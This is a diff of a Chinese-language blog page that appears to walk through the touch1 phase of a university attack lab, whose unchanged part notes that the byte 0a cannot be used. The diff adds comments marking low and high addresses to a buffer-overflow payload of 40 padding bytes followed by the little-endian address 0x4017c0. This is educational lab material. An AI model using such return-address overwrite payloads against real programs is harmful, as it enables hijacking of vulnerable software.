@@ -168,8 +168,8 @@
 <p><img src="/../../img/image-20231206212513293.png" alt="image-20231206212513293"></p>
 <p>touch1地址为0x4017c0</p>
 <p><img src="/../../img/image-20231207135234772.png" alt="image-20231207135234772"></p>
-<p>payload(注意不能填充0a)，同时小端序要倒序存储(低地址存放数据低位，高地址存放数据高位)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>payload(注意不能填充0a)，同时小端序要倒序存储(低地址存放数据低位，高地址存放数据高位) </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 #低地址</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00 #高地址</span><br></pre></td></tr></table></figure>
 
 <p><img src="/../../img/image-20231207134217597.png" alt="image-20231207134217597"></p>
 <p>通过</p>
